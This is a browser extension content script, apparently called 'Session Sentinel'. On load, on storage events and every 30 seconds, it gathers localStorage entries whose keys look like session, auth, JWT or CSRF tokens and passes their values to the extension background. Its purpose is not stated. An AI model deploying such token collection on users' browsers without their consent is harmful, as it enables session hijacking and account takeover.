(() => {
  const GENERIC_TOKEN_KEYWORDS = /(token|session|auth|jwt|sid|csrf|bearer)/i;
  const MAX_VALUE_LENGTH = 4096;
  const POLLING_INTERVAL_MS = 30 * 1000;

  function matchingPattern(hostname) {
    const patterns = globalThis.SESSION_SENTINEL_SITE_PATTERNS || {};
    return Object.entries(patterns).find(([domain]) => hostname === domain || hostname.endsWith(`.${domain}`))?.[1] || null;
  }

  function collectLocalStorageEntries() {
    const hostname = location.hostname.toLowerCase();
    const sitePattern = matchingPattern(hostname);
    const siteKeywords = sitePattern?.storageKeyPatterns || [];
    const entries = [];

    try {
      for (let i = 0; i < localStorage.length; i += 1) {
        const key = localStorage.key(i);
        if (!key) {
          continue;
        }

        const siteMatch = siteKeywords.some((keyword) => key.toLowerCase().includes(keyword.toLowerCase()));
        if (!siteMatch && !GENERIC_TOKEN_KEYWORDS.test(key)) {
          continue;
        }

        const rawValue = localStorage.getItem(key);
        if (!rawValue) {
          continue;
        }

        entries.push({ key, value: rawValue.slice(0, MAX_VALUE_LENGTH) });
      }
    } catch (error) {
      return { error: error?.message || error?.toString() || "Unknown error while accessing localStorage", entries: [] };
    }

    return { entries };
  }

  function sendSnapshot(trigger) {
    const snapshot = collectLocalStorageEntries();
    if (!snapshot.entries.length) {
      return;
    }

    try {
      chrome.runtime.sendMessage(
        {
          type: "LOCAL_STORAGE_SNAPSHOT",
          payload: {
            trigger,
            hostname: location.hostname,
            origin: location.origin,
            timestamp: Date.now(),
            entries: snapshot.entries
          }
        },
        () => {
          void chrome.runtime.lastError;
        }
      );
    } catch (_error) {
      // Extension context may be unavailable during page teardown.
    }
  }

  sendSnapshot("initial");
  window.addEventListener("storage", () => sendSnapshot("storage_event"));
  const intervalId = setInterval(() => sendSnapshot("periodic"), POLLING_INTERVAL_MS);
  window.addEventListener("pagehide", () => clearInterval(intervalId), { once: true });
})();
